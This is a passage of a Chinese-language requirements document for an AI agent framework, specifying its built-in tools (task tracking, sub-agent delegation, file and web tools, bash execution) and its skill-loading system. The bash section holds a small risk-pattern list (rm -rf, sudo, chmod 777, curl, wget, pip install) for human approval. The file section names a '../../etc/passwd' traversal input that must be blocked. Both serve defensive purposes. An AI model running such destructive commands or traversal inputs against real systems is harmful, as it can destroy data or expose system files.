- ✅ 响应时间<10ms
- ✅ 无需配置,开箱即用

**参考代码**: `generalAgent/tools/builtin/now.py`

---

#### FR-TOOL-002: todo_write工具 - 任务创建与更新

**需求描述**:
系统应提供任务列表管理工具,支持创建、更新、标记完成任务,追踪任务进度。

**核心能力**:
- ✅ 创建任务: 添加新任务到列表
- ✅ 更新任务: 修改任务内容和状态
- ✅ 删除任务: 从列表中移除
- ✅ 状态管理: pending/in_progress/completed
- ✅ 状态同步: 使用LangGraph Command更新state["todos"]

**任务模型**:
```python
{
    "content": "运行测试",        # 命令式(做什么)
    "activeForm": "正在运行测试",  # 进行时(正在做什么)
    "status": "in_progress"       # pending/in_progress/completed
}
```

**重要约束**:
- ⚠️ TODO是**追踪工具**,不是执行工具
- ⚠️ 必须先执行实际工具(read_file/web_search),再标记完成
- ⚠️ 禁止"创建TODO → 立即全部标记完成"的反模式
- ⚠️ 同时只能有1个in_progress任务

**使用场景**:
1. **任务分解**: 将大任务拆分为子任务列表
2. **进度追踪**: 实时显示当前执行到哪一步
3. **团队协作**: 明确任务分配和完成状态
4. **质量保证**: 确保所有步骤都已完成

**反模式示例**:
```
❌ 错误:
Agent> [Calls todo_write([task1, task2, task3])]
Agent> [Calls todo_write(mark task1 completed)]
Agent> [Calls todo_write(mark task2 completed)]
Agent> [Calls todo_write(mark task3 completed)]
# 没有实际执行任何工具!

✅ 正确:
Agent> [Calls todo_write([task1, task2, task3])]
Agent> [Calls todo_write(mark task1 in_progress)]
Agent> [Calls read_file(...)]  # 实际执行
Agent> [Calls web_search(...)]  # 实际执行
Agent> [Calls todo_write(mark task1 completed)]
```

**验收标准**:
- ✅ 任务创建后立即在state["todos"]中可见
- ✅ 状态更新通过LangGraph Command同步
- ✅ 同时最多1个in_progress任务
- ✅ 任务完成前必须有工具调用记录(通过prompt强化)

**参考代码**: `generalAgent/tools/builtin/todo_write.py`

---

#### FR-TOOL-003: todo_read工具 - 任务查看

**需求描述**:
系统应提供查看当前任务列表的工具,支持Agent检查任务状态。

**核心能力**:
- ✅ 显示所有任务
- ✅ 显示任务状态(pending/in_progress/completed)
- ✅ 格式化输出,易于阅读

**输出格式**:
```
任务列表:
1. [in_progress] 正在运行测试
2. [pending] 分析测试结果
3. [completed] 阅读代码文件
```

**使用场景**:
- Agent需要查看当前进度
- 用户询问"现在在做什么?"
- 验证任务是否全部完成

**验收标准**:
- ✅ 显示所有任务(包括completed)
- ✅ 状态标签清晰可见
- ✅ 响应时间<50ms

**参考代码**: `generalAgent/tools/builtin/todo_read.py`

---

#### FR-TOOL-004: delegate_task工具 - 子任务委派

**需求描述**:
系统应支持创建同类型subagent,委派子任务执行,实现任务分解和并行处理。

**核心能力**:
- ✅ **同类型副本**: Subagent使用与主Agent相同的模板(GeneralAgent)
- ✅ **上下文继承**: 继承mentioned_agents、active_skill、workspace_path、uploaded_files
- ✅ **上下文隔离**: 独立的messages、todos、loops
- ✅ **综合总结**: Subagent必须提供详细执行总结(工具历史对主Agent不可见)
- ✅ **连续机制**: 检测过短响应(<200字符),自动请求详细总结(最多1次)
- ✅ **HITL支持**: Subagent可使用ask_human向用户提问
- ✅ **中断处理**: 支持interrupt恢复和用户输入

**上下文隔离设计**:
```
MainAgent (context_id="main")
  ├── messages: [msg1, msg2, ..., msg100]  ← 主对话历史
  ├── todos: [task1, task2]
  └── mentioned_agents: ["@pdf"]

  └── delegate_task("分析PDF文件")

      Subagent (context_id="subagent-abc123")
        ├── messages: [task_description]   ← 只有任务描述!
        ├── todos: []                      ← 独立任务列表
        ├── mentioned_agents: ["@pdf"]     ← 继承
        ├── workspace_path: same           ← 继承
        ├── uploaded_files: same           ← 继承
        └── parent_context: "main"         ← 父引用
```

**关键约束**:
- ⚠️ Subagent看不到主对话历史 → 任务描述必须自包含(self-contained)
- ⚠️ 主Agent只看到Subagent的最后一条消息 → 必须是详细总结
- ⚠️ Subagent不能调用delegate_task → 防止无限嵌套

**连续机制**:
```python
# 检测过短响应
if len(last_message.content) < 200:
    # 自动请求详细总结
    continuation_prompt = """
    请提供更详细的总结。记住:
    1. 主Agent看不到你的工具调用历史
    2. 你需要详细说明你做了什么、发现了什么
    3. 包含关键信息、文件路径、数据结果
    """
    # 最多重试1次
```

**使用场景**:
1. **搜索任务**: "搜索Python 3.13新特性"
2. **调试任务**: "找到代码中所有使用deprecated API的地方"
3. **文档分析**: "分析这个50页的PDF报告,总结关键信息"
4. **数据处理**: "处理这个Excel表格,生成统计报告"

**验收标准**:
- ✅ Subagent能访问继承的工具和技能
- ✅ Subagent不能访问主对话历史
- ✅ 最后一条消息≥200字符(或经过1次连续请求)
- ✅ 总结包含:做了什么、发现了什么、结果是什么
- ✅ Subagent可以使用ask_human工具
- ✅ 用户输入带`[subagent-xxx]`前缀(清晰区分)

**参考代码**: `generalAgent/tools/builtin/delegate_task.py`

---

#### FR-TOOL-005: call_agent工具 - 跨类型Agent调用

**需求描述**:
系统应支持跨类型Agent调用,允许GeneralAgent调用SimpleAgent或其他专用Agent。

**核心能力**:
- ✅ **跨类型调用**: 从GeneralAgent调用不同类型Agent
- ✅ **能力切换**: 利用专用Agent的特定能力
- ✅ **返回Command**: 使用LangGraph Command对象更新父状态
- ✅ **参数传递**: 支持复杂参数和上下文信息

**使用场景**:
1. **代码分析**: 调用CodeAgent分析代码质量
2. **快速查询**: 调用SimpleAgent处理简单问答
3. **专业任务**: 调用领域专用Agent(如FinanceAgent)

**与delegate_task对比**:

| 特性 | delegate_task | call_agent |
|------|---------------|------------|
| Agent类型 | 同类型(GeneralAgent) | 跨类型(SimpleAgent等) |
| 上下文继承 | 部分继承(工具/技能/文件) | 完全独立 |
| 对话历史 | 隔离(只有任务描述) | 独立 |
| 适用场景 | 任务分解、并行处理 | 能力切换、专业任务 |

**验收标准**:
- ✅ 能调用AgentRegistry中注册的任何Agent
- ✅ 返回结果通过Command更新父状态
- ✅ 调用失败时有明确错误信息
- ✅ 支持超时控制

**参考代码**: `generalAgent/tools/builtin/call_agent.py`

---

#### FR-TOOL-006: ask_human工具 - 人机交互

**需求描述**:
系统应支持Agent主动请求用户信息,实现人机协同和交互式工作流。

**核心能力**:
- ✅ **主动提问**: Agent可在需要时请求用户输入
- ✅ **上下文提供**: 可附加额外上下文信息
- ✅ **默认值**: 支持设置默认值
- ✅ **必填/可选**: 控制用户是否必须回答
- ✅ **interrupt机制**: 使用LangGraph interrupt暂停执行
- ✅ **恢复执行**: 用户回答后通过Command恢复

**工具签名**:
```python
def ask_human(
    question: str,              # 问题
    context: str = "",          # 额外上下文
    input_type: str = "text",   # 输入类型(当前仅支持text)
    default: Optional[str] = None,  # 默认值
    required: bool = True       # 是否必填
) -> str:
    """向用户请求信息"""
```

**使用场景**:
1. **缺少信息**: "您希望报告以什么格式输出?(PDF/Word/Markdown)"
2. **确认决策**: "即将删除10个文件,是否继续?"
3. **多选项**: "找到3个可能的解决方案,您选择哪一个?"
4. **用户偏好**: "您偏好使用哪个模型?(GPT-4/Claude/Gemini)"

**用户体验**:
```
Agent> 我需要了解您的偏好才能继续。

💬 您希望报告以什么格式输出?
   (默认: markdown)
> PDF

Agent> 好的,我将生成PDF格式的报告。
```

**验收标准**:
- ✅ interrupt触发后Agent执行暂停
- ✅ 用户输入后Agent从暂停点恢复
- ✅ 支持默认值(用户可直接回车使用)
- ✅ required=False时允许空输入
- ✅ 用户输入作为ToolMessage返回给Agent

**参考代码**: `generalAgent/tools/builtin/ask_human.py`

---

### 文件操作工具需求

#### FR-TOOL-007: read_file工具 - 多格式文件读取

**需求描述**:
系统应支持读取多种格式文件,自动检测格式并提取内容,为Agent提供文件访问能力。

**支持格式**:

| 格式 | 小文件阈值 | 小文件处理 | 大文件处理 |
|------|-----------|----------|----------|
| **文本** | 100KB | 完整内容 | 前50K字符+截断提示 |
| **PDF** | ≤10页 | 完整内容 | 前10页预览+搜索提示 |
| **DOCX** | ≤10页 | 完整内容 | 前10页预览+搜索提示 |
| **XLSX** | ≤3个表 | 完整内容 | 前3个表预览+搜索提示 |
| **PPTX** | ≤15张 | 完整内容 | 前15张预览+搜索提示 |

**核心能力**:
- ✅ **自动格式检测**: 根据文件扩展名选择提取器
- ✅ **文本文件**: 直接读取内容
- ✅ **PDF**: PyPDF2提取文本,保留页码
- ✅ **DOCX**: python-docx提取段落和表格
- ✅ **XLSX**: openpyxl提取表格数据
- ✅ **PPTX**: python-pptx提取幻灯片内容
- ✅ **大文件预览**: 避免token超限,提供搜索建议
- ✅ **错误处理**: 格式损坏时返回友好错误

**大文件处理策略**:
```
大PDF(50页):
  → 预览前10页(~30K chars)
  → 提示: "文件较大,建议使用 search_file 工具搜索关键内容"
  → 显示文件元信息: 总页数、大小

大Excel(10个表):
  → 预览前3个表(~20K chars)
  → 提示: "更多表格请使用 search_file 搜索,或指定表名"
```

**使用场景**:
1. **阅读代码**: `read_file("src/main.py")`
2. **查看报告**: `read_file("uploads/annual_report.pdf")`
3. **检查配置**: `read_file("config.yaml")`
4. **阅读技能文档**: `read_file("skills/pdf/SKILL.md")`

**验收标准**:
- ✅ 所有支持格式能正确提取内容
- ✅ 大文件返回预览而非完整内容
- ✅ 错误信息清晰(如"文件不存在"、"格式不支持")
- ✅ 路径必须在workspace内(安全检查)

**参考代码**:
- `generalAgent/tools/builtin/file_ops.py:read_file`
- `generalAgent/utils/document_extractors.py`

---

#### FR-TOOL-008: write_file工具 - 文件创建

**需求描述**:
系统应支持在workspace中创建新文件,遵循"框架优先、内容后补"的最佳实践。

**核心能力**:
- ✅ **创建新文件**: 在workspace/outputs/或workspace/temp/创建文件
- ✅ **覆盖写入**: 如果文件已存在,覆盖内容
- ✅ **路径安全**: 只能写入outputs/、temp/、uploads/目录
- ✅ **自动创建目录**: 父目录不存在时自动创建

**最佳实践**(Claude Code Pattern):
```
⚠️ 对于新文件:
1. write_file 创建框架(使用 [TBD] 标记待完成部分)
2. edit_file 逐节展开内容

⚠️ 对于现有文件:
1. 直接使用 edit_file 修改

为什么?
- Token高效: edit_file只传输变化部分,不会被截断
- 不会被截断: 增量修改总能fit within max_completion_tokens
- 更安全: 保留未变化内容
```

**反模式示例**:
```
❌ 错误: 一次性write_file全部内容(会被截断)
write_file("outputs/long_report.md", """
# 20天旅行计划
## 第1天: 东京
...
## 第20天: 大阪
(3000行内容)
""")
→ Result: 内容被截断,JSON parse error

✅ 正确: write_file框架 + edit_file展开
write_file("outputs/long_report.md", """
# 20天旅行计划
## 第1天: [TBD]
## 第2天: [TBD]
...
## 第20天: [TBD]
""")

edit_file(
    file_path="outputs/long_report.md",
    old_string="## 第1天: [TBD]",
    new_string="## 第1天: 东京\n- 上午: 浅草寺\n- 下午: 秋叶原\n..."
)
```

**使用场景**:
1. **生成报告**: 创建Markdown/PDF报告
2. **保存结果**: 保存分析结果为JSON
3. **创建配置**: 生成YAML配置文件
4. **导出数据**: 保存CSV数据文件

**验收标准**:
- ✅ 只能写入outputs/、temp/、uploads/目录
- ✅ 路径traversal攻击被拦截(如`../../etc/passwd`)
- ✅ 文件创建成功返回文件路径
- ✅ SystemMessage和工具docstring都强调最佳实践

**参考代码**: `generalAgent/tools/builtin/file_ops.py:write_file`

---

#### FR-TOOL-009: edit_file工具 - 精确文件编辑

**需求描述**:
系统应支持精确的字符串替换编辑,实现token高效的文件修改。

**核心能力**:
- ✅ **精确替换**: 将old_string替换为new_string
- ✅ **全局替换**: replace_all=true替换所有出现
- ✅ **唯一性检查**: old_string必须唯一(除非replace_all)
- ✅ **Token高效**: 只传输变化部分,不会被截断
- ✅ **安全性**: 保留未变化内容

**工具签名**:
```python
def edit_file(
    file_path: str,        # 文件路径(workspace相对路径)
    old_string: str,       # 要替换的字符串(必须唯一)
    new_string: str,       # 替换后的字符串
    replace_all: bool = False  # 是否替换所有出现
) -> str:
    """精确替换文件内容"""
```

**唯一性检查**:
```python
# 场景1: old_string唯一 → 成功
edit_file(
    "report.md",
    old_string="## 第1天: [TBD]",
    new_string="## 第1天: 东京\n- 浅草寺\n- 秋叶原"
)
✅ Success

# 场景2: old_string不唯一 → 失败
edit_file(
    "report.md",
    old_string="[TBD]",  # 出现20次!
    new_string="东京"
)
❌ Error: "old_string appears 20 times. Use replace_all or provide more context"

# 场景3: 使用replace_all
edit_file(
    "config.yaml",
    old_string="enabled: false",
    new_string="enabled: true",
    replace_all=True  # 替换所有enabled: false
)
✅ Success: Replaced 5 occurrences
```

**为什么Token高效**:
- write_file: 传输整个文件(可能几千行) → 容易被截断
- edit_file: 只传输old_string + new_string(几百tokens) → 永不截断

**使用场景**:
1. **展开框架**: 将[TBD]替换为实际内容
2. **修复错误**: 替换代码中的bug
3. **更新配置**: 修改配置文件参数
4. **重命名**: 全局替换变量名(replace_all=True)

**验收标准**:
- ✅ old_string不唯一时返回错误(除非replace_all)
- ✅ 文件不存在时返回错误
- ✅ 路径必须在workspace内
- ✅ 替换成功返回成功消息

**参考代码**: `generalAgent/tools/builtin/edit_file.py`

---

#### FR-TOOL-010: find_files工具 - 文件名搜索

**需求描述**:
系统应支持基于glob模式的文件名快速搜索,帮助Agent定位文件。

**核心能力**:
- ✅ **Glob模式**: 支持`*`、`**`、`?`、`{}`通配符
- ✅ **递归搜索**: `**`表示递归所有子目录
- ✅ **多扩展名**: `*.{pdf,docx}`同时匹配多种格式
- ✅ **实时搜索**: 无索引,直接扫描文件系统(<10ms)

**搜索模式示例**:
```python
# 所有PDF文件
find_files("*.pdf")
→ ["uploads/report.pdf", "outputs/summary.pdf"]

# 递归搜索所有Python文件
find_files("**/*.py")
→ ["skills/pdf/scripts/extract.py", "outputs/script.py"]

# 指定目录搜索
find_files("*report*", path="uploads")
→ ["uploads/annual_report.pdf", "uploads/report_2024.docx"]

# 多个扩展名
find_files("*.{pdf,docx,xlsx}")
→ ["uploads/file1.pdf", "uploads/file2.docx", "uploads/file3.xlsx"]
```

**使用场景**:
1. **定位上传文件**: 用户说"处理那个PDF",Agent搜索`*.pdf`
2. **查找脚本**: 查找技能包中的Python脚本
3. **批量操作**: 找到所有Markdown文件进行处理
4. **文件整理**: 列出outputs/目录下的所有生成文件

**与search_file对比**:

| 特性 | find_files | search_file |
|------|-----------|-------------|
| 搜索目标 | 文件名 | 文件内容 |
| 搜索速度 | <10ms | 首次2-5s, 后续<100ms |
| 索引需求 | 无 | 需要 |
| 适用场景 | 知道文件名/类型 | 知道内容关键词 |

**验收标准**:
- ✅ 支持标准glob模式语法
- ✅ 递归搜索正常工作
- ✅ 搜索范围限制在workspace内
- ✅ 返回相对路径(workspace相对)
- ✅ 搜索时间<10ms

**参考代码**: `generalAgent/tools/builtin/find_files.py`

---

#### FR-TOOL-011: search_file工具 - 文件内容搜索

**需求描述**:
系统应支持文件内容全文搜索,使用SQLite FTS5索引实现高性能搜索,支持中文分词。

**核心能力**:
- ✅ **文本文件**: 实时逐行扫描 + 上下文
- ✅ **文档文件**: 索引搜索(PDF/DOCX/XLSX/PPTX)
- ✅ **中文分词**: Jieba智能分词
- ✅ **BM25排序**: 相关性排序算法
- ✅ **N-gram匹配**: trigram(10分) > bigram(5分) > unigram(2分)
- ✅ **自动索引**: 首次搜索自动建立索引
- ✅ **全局缓存**: MD5指纹去重,跨会话共享索引

**搜索策略**:

**文本文件**(实时扫描):
```python
search_file("error.log", "ERROR")
→ 实时扫描,返回匹配行和上下文
→ 无索引开销
→ 适合小文件(<10MB)
```

**文档文件**(索引搜索):
```python
# 首次搜索
search_file("uploads/report.pdf", "Q3营收")
→ [建立索引: 2-5秒]
→ [中文分词: "Q3" + "营收"]
→ [BM25排序]
→ 返回匹配片段 + 页码

# 后续搜索
search_file("uploads/report.pdf", "利润率")
→ [使用现有索引: <100ms]
→ 返回匹配片段 + 页码
```

**索引技术**:
- ✅ **SQLite FTS5**: 全文搜索引擎
- ✅ **Jieba分词**: 中文智能分词("Q3营收" → ["Q3", "营收"])
- ✅ **BM25排序**: TF-IDF相关性排序
- ✅ **N-gram匹配**:
  - Trigram match(短语): 10分
  - Bigram match(词组): 5分
  - Unigram match(单词): 2分

**索引管理**:
- ✅ **MD5指纹**: 相同内容共享索引(去重)
- ✅ **全局缓存**: `data/indexes/{md5}/index.db`
- ✅ **自动清理**: 24小时未使用标记为陈旧
- ✅ **自动更新**: 文件变化时删除旧索引,创建新索引

**分块策略**:

| 格式 | 分块策略 | 理由 |
|------|----------|------|
| PDF | 按页(1页/块) | 保留表格完整性 |
| DOCX | 按段落(~1000字符, 20%重叠) | 保持可读性,避免边界截断 |
| XLSX | 按表(1个表/块) | 逻辑单元完整 |
| PPTX | 按幻灯片(1张/块) | 语义完整 |

**性能指标**:
- 首次搜索(50页PDF): 2-5秒(建立索引)
- 后续搜索: <100ms(使用索引)
- 索引大小: 原文件的20-30%
- 搜索准确率: +40-60%(对比无索引)

**使用场景**:
1. **关键词搜索**: "找到报告中所有提到'Q3营收'的地方"
2. **问题定位**: "搜索错误日志中的'OutOfMemory'"
3. **数据查找**: "在Excel中搜索'客户流失率'"
4. **文档分析**: "找出PDF中所有关于'风险评估'的段落"

**验收标准**:
- ✅ 首次搜索自动建立索引
- ✅ 后续搜索响应时间<100ms
- ✅ 中文分词准确(识别"营收"而非"营"+"收")
- ✅ 短语匹配优先级高于单词匹配
- ✅ 相同文件不重复索引(MD5去重)
- ✅ 返回结果包含片段内容和位置(页码/行号)

**参考代码**:
- `generalAgent/tools/builtin/search_file.py`
- `generalAgent/utils/text_indexer.py`
- `generalAgent/utils/document_extractors.py`

---

#### FR-TOOL-012: list_workspace_files工具 - 目录列表

**需求描述**:
系统应支持列出workspace目录内容,帮助Agent了解可用文件。

**核心能力**:
- ✅ **列出目录**: 显示指定目录下的文件和子目录
- ✅ **递归选项**: 可选择是否递归列出子目录
- ✅ **文件信息**: 显示文件大小、类型、修改时间
- ✅ **安全限制**: 只能列出workspace内的目录

**输出示例**:
```
workspace/
├── skills/
│   └── pdf/
│       ├── SKILL.md (5.2KB)
│       └── scripts/ (dir)
├── uploads/
│   ├── report.pdf (2.3MB)
│   └── data.xlsx (156KB)
├── outputs/
│   └── summary.md (12KB)
└── temp/
    └── cache.json (3KB)
```

**使用场景**:
1. **文件盘点**: "列出我上传了哪些文件"
2. **查看技能**: "看看pdf技能包含哪些脚本"
3. **检查输出**: "已经生成了哪些文件?"
4. **清理准备**: "temp目录里有什么临时文件?"

**验收标准**:
- ✅ 显示文件大小(人类可读格式)
- ✅ 区分文件和目录
- ✅ 路径必须在workspace内
- ✅ 响应时间<100ms

**参考代码**: `generalAgent/tools/builtin/file_ops.py:list_workspace_files`

---

### 网络工具需求

#### FR-TOOL-013: fetch_web工具 - 网页内容获取

**需求描述**:
系统应支持获取网页内容并转换为LLM友好的Markdown格式。

**核心能力**:
- ✅ **HTML转Markdown**: 自动清理HTML标签
- ✅ **提取正文**: 去除导航、广告、侧边栏
- ✅ **保留结构**: 标题、列表、表格、链接
- ✅ **图片处理**: 保留图片URL和alt文本
- ✅ **代码高亮**: 保留代码块格式和语言标记

**使用场景**:
1. **获取文档**: "获取Python官方文档关于新特性的页面"
2. **新闻阅读**: "获取这篇技术新闻的内容"
3. **教程学习**: "下载这个教程页面以便离线阅读"
4. **API文档**: "获取这个API的文档页面"

**错误处理**:
- ✅ URL无效: 返回"无效的URL格式"
- ✅ 页面不存在: 返回"404 Not Found"
- ✅ 网络超时: 返回"请求超时,请稍后重试"
- ✅ 反爬虫拦截: 返回"页面访问被拒绝"

**验收标准**:
- ✅ 成功获取主流网站内容
- ✅ Markdown格式正确(标题、列表、代码块)
- ✅ 广告和导航被过滤
- ✅ 代码块保留语言标记
- ✅ 错误信息清晰友好

**参考代码**: `generalAgent/tools/builtin/jina_fetch.py`
- 会改为纳米相关的服务实现

---

#### FR-TOOL-014: search_web工具 - 网络搜索

**需求描述**:
系统应支持网络搜索,返回LLM优化的搜索结果,支持并行内容清洗。

**核心能力**:
- ✅ **多结果**: 支持num_results参数(1-10)
- ✅ **内容清洗**: 使用LLM清洗搜索结果(可选)
- ✅ **并行清洗**: asyncio并发清洗多个结果(~80%时间节省)
- ✅ **并发限制**: Semaphore(10)防止API限流
- ✅ **错误恢复**: 单个清洗失败不影响其他结果

**Jina Search API**:
```
GET https://s.jina.ai/{query}?count={num_results}
```
- 会改为纳米相关的服务实现

**使用场景**:
1. **快速调研**: "搜索Python 3.13的主要新特性"
2. **问题解决**: "搜索如何解决Docker容器启动失败"
3. **资料收集**: "搜索关于Agent架构的最佳实践"
4. **新闻查询**: "搜索最新的AI行业动态"

**验收标准**:
- ✅ 返回num_results个结果
- ✅ 每个结果包含title、snippet、url
- ✅ 并行清洗正常工作
- ✅ 单个清洗失败不影响其他
- ✅ 总时间≈max(单个清洗时间)

**参考代码**: `generalAgent/tools/builtin/jina_search.py`

---

### 执行工具需求

#### FR-TOOL-015: run_bash_command工具 - Bash命令执行

**需求描述**:
系统应支持在workspace中执行bash命令和Python脚本,用于运行技能包脚本和系统操作。
- Windows 平台使用命令行

**核心能力**:
- ✅ **Bash命令**: 执行任意bash命令
- ✅ **Python脚本**: 执行技能包中的Python脚本
- ✅ **Timeout**: 默认30秒,可配置
- ✅ **环境变量**: 自动设置AGENT_WORKSPACE_PATH
- ✅ **工作目录**: 默认为workspace路径
- ✅ **标准输出**: 捕获stdout和stderr

**安全控制**(通过HITL):
- ✅ **默认需审批**: 所有命令默认需要人工审批
- ✅ **风险检测**: 检测rm -rf、sudo、chmod 777等
- ✅ **路径隔离**: 限制在workspace内执行
- ✅ **Timeout保护**: 防止无限执行

**审批规则**(hitl_rules.yaml):
```yaml
tools:
  run_bash_command:
    enabled: true
    patterns:
      high_risk:
        - "rm\\s+-rf"       # 递归删除
        - "sudo"            # 超级用户
        - "chmod\\s+777"    # 危险权限
      medium_risk:
        - "curl"            # 网络请求
        - "wget"            # 下载文件
        - "pip\\s+install"  # 安装包
    actions:
      high_risk: require_approval
      medium_risk: require_approval
```

**使用场景**:
1. **运行技能脚本**:
   ```bash
   python skills/pdf/scripts/fill_fillable_fields.py uploads/form.pdf outputs/filled.pdf
   ```

2. **文件操作**:
   ```bash
   ls -lh uploads/
   cp uploads/file.txt outputs/backup.txt
   ```

3. **数据处理**:
   ```bash
   cat uploads/data.csv | grep "error" > outputs/errors.txt
   ```

4. **系统检查**:
   ```bash
   df -h  # 检查磁盘空间
   ps aux | grep python  # 检查进程
   ```

**审批用户体验**:
```
Agent> [Calls run_bash_command("rm -rf outputs/old_files/")]

🛡️  工具审批: run_bash_command
   原因: 检测到危险命令(递归删除)
   命令: rm -rf outputs/old_files/
   批准? [y/n] > y

Agent> 已删除旧文件。
```

**错误处理**:
- ✅ 命令不存在: "Command not found: xxx"
- ✅ 权限不足: "Permission denied"
- ✅ 超时: "Command timed out after 30s"
- ✅ 非零退出: "Command failed with exit code 1"

**验收标准**:
- ✅ 危险命令触发HITL审批
- ✅ 安全命令(ls/pwd/cat)自动通过
- ✅ Timeout正常工作
- ✅ 环境变量AGENT_WORKSPACE_PATH正确设置
- ✅ 捕获完整的stdout和stderr

**参考代码**: `generalAgent/tools/builtin/run_bash_command.py`

---

### 上下文管理工具需求

#### FR-TOOL-016: compact_context工具 - 手动压缩上下文

**需求描述**:
系统应支持手动触发上下文压缩,在Token使用率达到阈值时可动态加载。

**核心能力**:
- ✅ **手动触发**: Agent可主动调用压缩
- ✅ **策略选择**: 支持"compact"和"truncate"两种策略
- ✅ **动态加载**: 默认禁用,Token>75%时通过@mention加载
- ✅ **与自动压缩协同**: 可作为自动压缩的补充

**压缩策略**:

**1. compact策略**(推荐):
- 使用LLM总结旧消息
- 保留近期消息(15%窗口或10条)
- 压缩比: 90-95%

**2. truncate策略**(紧急):
- 直接截断,保留最近N条
- 无LLM调用开销
- 压缩比: 取决于保留消息数

**动态加载机制**:

触发警报 比如 75% 的时候，会提醒模型使用 @compact_context 工具压缩上下文

```python
# Token使用率监控
if cumulative_prompt_tokens / context_window > 0.75:
    # 生成提醒
    reminder = """
    ⚠️ Token使用率: 78%
    可用 @compact_context 工具压缩上下文
    """
    # 动态加载工具
    tool_registry.load_on_demand("compact_context")
```

**使用场景**:
1. **预防性压缩**: Token使用率达到75%时主动压缩
2. **紧急压缩**: 接近上限时快速释放空间
3. **测试压缩**: 开发时测试压缩效果

**与自动压缩对比**:

| 特性 | compact_context(手动) | 自动压缩(95%触发) |
|------|----------------------|------------------|
| 触发方式 | Agent主动调用 | 系统自动触发 |
| 触发时机 | 任意时候 | Token>95% |
| 用户感知 | 工具调用可见 | 完全静默 |
| 适用场景 | 预防性压缩、测试 | 生产环境自动管理 |

**验收标准**:
- ✅ 默认不加载(enabled: false)
- ✅ Token>75%时提醒可用
- ✅ @mention后成功加载
- ✅ compact策略正常工作
- ✅ truncate策略正常工作
- ✅ 压缩后Token使用率<10%

**参考代码**: `generalAgent/tools/builtin/compact_context.py`

---

## 添加自定义工具

### 步骤1: 创建工具文件

在`generalAgent/tools/custom/`创建`my_tool.py`:

```python
from langchain_core.tools import tool

@tool
def my_custom_tool(param1: str, param2: int = 10) -> str:
    """简短描述工具功能

    Args:
        param1: 参数1说明
        param2: 参数2说明(可选)

    Returns:
        执行结果
    """
    # 实现逻辑
    return f"Result: {param1} with {param2}"
```

### 步骤2: 添加配置(可选)

在`tools.yaml`中添加:

```yaml
optional:
  my_custom_tool:
    enabled: true
    category: "custom"
    tags: ["utility"]
    description: "我的自定义工具"
```

### 步骤3: 重启应用

工具自动发现并加载,无需修改代码。

---

## 参考代码位置

| 功能模块 | 代码路径 |
|---------|---------|
| 工具注册表 | `generalAgent/tools/registry.py` |
| 工具扫描器 | `generalAgent/tools/discovery.py` |
| 工具配置 | `generalAgent/config/tools.yaml` |
| 内置工具目录 | `generalAgent/tools/builtin/` |
| 自定义工具目录 | `generalAgent/tools/custom/` |
| MCP集成 | `generalAgent/tools/mcp_integration.py` |

---

# 4. 技能系统

## 产品定位

技能系统是框架的知识增强层,通过SKILL.md文档+可执行脚本的组合,为AI Agent提供领域专业知识和专业工具能力。技能是**知识包**而非工具容器,Agent通过阅读SKILL.md获取指导,通过执行scripts完成专业操作。系统支持依赖自动安装、文件类型自动加载、工作区隔离。

**核心价值**:
- **知识传递**: SKILL.md文档化专业知识,Agent阅读后即可执行
- **专业能力**: 内置技能覆盖PDF/Office文档处理、Artifacts生成
- **自动安装**: requirements.txt依赖自动安装,无需手动配置
- **按需加载**: @mention或文件上传触发,节省系统资源

---

## 内置技能清单

| 技能ID | 名称 | 功能 | 自动触发 |
|--------|------|------|---------|
| `pdf` | PDF处理 | 表单填写、页面提取、合并拆分、转换 | 上传.pdf文件 |
| `docx` | Word处理 | 创建/编辑、Redlining修订、邮件合并 | 上传.docx文件 |
| `xlsx` | Excel处理 | 数据分析、财务建模、图表生成 | 上传.xlsx文件 |
| `pptx` | PowerPoint处理 | 创建演示文稿、模板应用 | 上传.pptx文件 |
| `artifacts-builder` | 可交付物生成 | HTML/SVG/Mermaid/React组件 | @mention |
| `skill-creator` | 技能创建器 | 快速创建新技能包 | @mention |

---

## 技能结构

### 标准目录结构

```
generalAgent/skills/{skill_id}/
├── SKILL.md              # 核心文档(必需)
│   ├── 技能概述
│   ├── 使用指南
│   ├── 工作流程
│   └── 脚本引用
│
├── requirements.txt      # Python依赖(可选)
│   └── pypdf2>=3.0.0
│
├── reference.md          # 扩展参考(可选)
│   └── API文档、最佳实践
│
└── scripts/              # 可执行脚本(可选)
    ├── extract_text.py
    ├── fill_form.py
    └── merge_pdfs.py
```

### SKILL.md示例

```markdown
# PDF处理技能

## 技能概述
本技能提供PDF文档的专业处理能力,包括:
- 表单填写(可填写字段和不可填写字段)
- 页面提取、合并、拆分
- 格式转换(PDF↔图片、Word)

## 使用指南

### 场景1: 填写PDF表单

#### 可填写表单(有表单字段)
1. 使用`read_file`读取PDF,检查是否为表单
2. 如果提示"此PDF包含X个表单字段",使用以下命令:
   ```bash
   python skills/pdf/scripts/fill_fillable_fields.py \
       uploads/form.pdf \
       outputs/filled.pdf \
       --data '{"name": "张三", "age": "30"}'
   ```

#### 不可填写表单(扫描件/纯文本)
1. 使用Redlining工作流(参考docx技能)
2. 或使用覆盖文本的方式

### 场景2: 合并多个PDF
```bash
python skills/pdf/scripts/merge_pdfs.py \
    uploads/doc1.pdf uploads/doc2.pdf \
    --output outputs/merged.pdf
```

## 可用脚本

| 脚本名称 | 功能 | 参数 |
|---------|------|------|
| extract_text.py | 提取文本 | input_pdf, output_txt |
| fill_fillable_fields.py | 填写表单字段 | input_pdf, output_pdf, --data |
| merge_pdfs.py | 合并PDF | inputs..., --output |

## 注意事项
- 所有脚本使用相对路径(相对于workspace根目录)
- 输出文件保存到outputs/目录
- 大文件(>10MB)建议分页处理

---

## 技能加载机制

### 加载触发方式

| 触发方式 | 示例 | 行为 |
|---------|------|------|
| @mention | `@pdf 帮我填写表单` | 手动加载技能 |
| 文件上传 | 上传`report.pdf` | 自动加载pdf技能 |
| 配置启用 | `enabled: true` | 启动时加载 |

### 动态加载流程

```
1. 检测触发(用户@mention 或 上传匹配文件)
   ↓
2. WorkspaceManager 链接技能到工作区
   - 创建符号链接: workspace/skills/pdf → generalAgent/skills/pdf
   ↓
3. 检查dependencies (requirements.txt)
   - 如果存在,执行: pip install -r requirements.txt
   - 标记为已安装(每个session只安装一次)
   ↓
4. 生成提醒消息
   - <system_reminder>已加载技能: pdf</system_reminder>
   - <system_reminder>建议: 先使用read_file读取SKILL.md</system_reminder>
   ↓
5. Agent 使用read_file读取SKILL.md
   ↓
6. Agent 按照SKILL.md指导执行任务
```

---

## 技能配置

配置文件:`generalAgent/config/skills.yaml`

```yaml
global:
  enabled: true
  auto_load_on_file_upload: true  # 文件上传自动加载

